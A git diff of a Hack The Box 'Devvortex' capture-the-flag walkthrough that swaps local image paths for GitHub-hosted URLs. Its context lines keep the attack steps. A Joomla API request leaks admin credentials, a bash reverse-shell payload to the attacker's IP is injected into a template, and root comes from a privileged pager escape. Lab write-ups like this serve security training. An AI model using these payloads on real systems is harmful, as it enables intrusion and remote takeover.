@@ -1,5 +1,5 @@
 # <center>Devvortex</center>
-<p align="center"><img src="../.medias/devvortex/devvortex_logo.png"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/devvortex_logo.png"></p>
 
 Hello everyone. Let's solve an easy labeled linux based HTB machine named Devvortex.
 
@@ -45,7 +45,7 @@ Now we are good to go. we can access the website through our browser. Now let's 
 
 ```
 From the scan we can see normal port 80 -> http, it's domain `http://devvortex.htb` and 443 -> SSH, and  are open. Also it says, ngnix https server is running on port 80, but right now it is not accessible through the ip address. So let's add the ip and domain name in our /etc/hosts file.
-![adding host file](../.medias/devvortex/editing_hosts_file.jpg
+![adding host file](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/editing_hosts_file.jpg
 )
 
 
@@ -93,7 +93,7 @@ Navigating to the domain, we can see a simple static website, and nothing much o
 
 - So, we just found a complete domain. Let's add this as well in out /etc/hosts file and examine the website.
 - while navigating through the website manually, I got a robots.txt file.
-![robots.txt file](../.medias/devvortex/robots_file.jpg)
+![robots.txt file](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/robots_file.jpg)
 
 - /administrator immediately caught my eyes, and it has a joomla login page. I researched about joomla and found these features from [wikipedia](https://en.wikipedia.org/wiki/Joomla).
     - Joomla is a framework (CMS)
@@ -109,22 +109,22 @@ Navigating to the domain, we can see a simple static website, and nothing much o
 
     - ```curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true```
 
-    - ![api endpoint](../.medias/devvortex/api_endpoint.jpg)
+    - ![api endpoint](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/api_endpoint.jpg)
 
     - user: lewis
     - password: P4ntherg0t1n5r3c0n##
 
 - Using the credentials I got logged in.
-    - ![logged in](../.medias/devvortex/loggedin.jpg
+    - ![logged in](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/loggedin.jpg
     )
 Now my first intension was to get some place where I can inject some payloads to get get remode code execution(RCE). On navigating through different sections in the page, I came to a index.php file in system -> administrator templates -> atum files -> index.php. That php file could be used to run my payload and get a reverse shell. So I included a bash -i reverse shell command in the login.php file using system command and fired up my netcat listener on port 1234.
 
 `system('bash -c "bash -i >& /dev/tcp/10.10.14.151/1234 0>&1"');`
 
-![payload input section](../.medias/devvortex/payload_input_section.jpg)
+![payload input section](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/payload_input_section.jpg)
 
 A reverse shell will land on your netcat after you save the changes.
-![reverse shell](../.medias/devvortex/reverse_shell.jpg).
+![reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/reverse_shell.jpg).
 
 Let's first stabilize the shell using the following command:
 ```bash
@@ -183,7 +183,7 @@ after this command , a password field is prompted is and entering the password w
 
     Here we got the bcrypt hashed password for both user lewis and logan. Iused [this website](https://hashes.com/en/tools/hash_identifier) to decrypt the hash and retrieve the password.
 
-    ![hash decrypted](../.medias/devvortex/decrypt_hash.jpg)
+    ![hash decrypted](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/decrypt_hash.jpg)
 
     <center>or</center>
 
@@ -242,7 +242,7 @@ after this command , a password field is prompted is and entering the password w
 
 From recon part we know that SSH is running on open port 22. So, lets use the credentials to log into logan account using ssh. the we can simply cat out the user flag.
 
-![user flag](../.medias/devvortex/user_flag.jpg)
+![user flag](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/user_flag.jpg)
 
 ## Privilege Escalation
 
@@ -317,7 +317,7 @@ Please choose (S/V/K/I/C):
 ```
 
 By choosing to view the report, a Vi-like editor appeared, and I immediately remembered that by passing the !:command syntax, I could execute code. Since I was running the binary in a privileged context, I could gain root access by executing `!/bin/bash`  
-    - ![getting vi like editor](../.medias/devvortex/getting_vi_like_editor.jpg)
+    - ![getting vi like editor](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/getting_vi_like_editor.jpg)
 
 
 After executing the command i was able to gain root access.
@@ -341,4 +341,4 @@ root@devvortex:/home/logan#
 Now, simply going to /root directory we can cat out the root flag. 
 Hope this walkthrough was really interesting and you got to learn something new. Thankyou.
 
-<p align="center"><img src="../.medias/devvortex/devvortex_pwned.jpg"></p>
+<p align="center"><img src="https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/devvortex/devvortex_pwned.jpg"></p>
